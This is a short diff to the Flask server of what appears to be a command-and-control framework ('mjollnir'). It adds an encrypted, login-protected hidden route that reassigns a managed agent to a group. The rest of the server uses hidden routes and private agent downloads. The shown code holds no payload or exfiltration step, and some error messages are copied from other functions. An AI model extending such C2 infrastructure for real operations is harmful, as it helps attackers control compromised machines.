@@ -71,6 +71,39 @@ def generate_agent():
         location_download = config["mjollnir_c2_url"] + config["hidden_route"] + config["endpoints"]["private_download"] + "/" + d["OUTPUT_FILENAME"]
         return encrypt("[+] Agent created. Privately downloadable at: " + location_download)
 
+# edit agent group
+@agent.route(config["hidden_route"] + config["endpoints"]["agent"] + "/<path:agent_uid>", methods=['POST'])
+@login_required
+def edit_agent_group(agent_uid):
+    agent = Agent.query.filter_by(agent_uid=agent_uid).first()
+
+    try:
+        content = request.data
+        d = decrypt(content)
+    except Exception as e:
+        print("[-] Error in create_listener()")
+        print(str(e))
+        return encrypt("[-] Cannot decrypt the request")
+
+    d = json.loads(d)
+    #print(d)
+
+    agent_group = d["agent_group"]
+
+    try:
+        if agent:
+            agent.agent_group = agent_group
+            db.session.commit()
+        else:
+            return encrypt("[-] Agent does not exist: " + agent_uid)
+        
+    except Exception as e:
+        print("[-] Error in delete_agent()")
+        print("[-] Cannot delete the agent")
+        print(str(e))
+        return encrypt("[-] Cannot delete the agent: " + agent_uid)
+
+    return encrypt("[+] Agent group updated: " + agent_uid)
 
 # delete an agent
 @agent.route(config["hidden_route"] + config["endpoints"]["agent"], methods=['DELETE'])
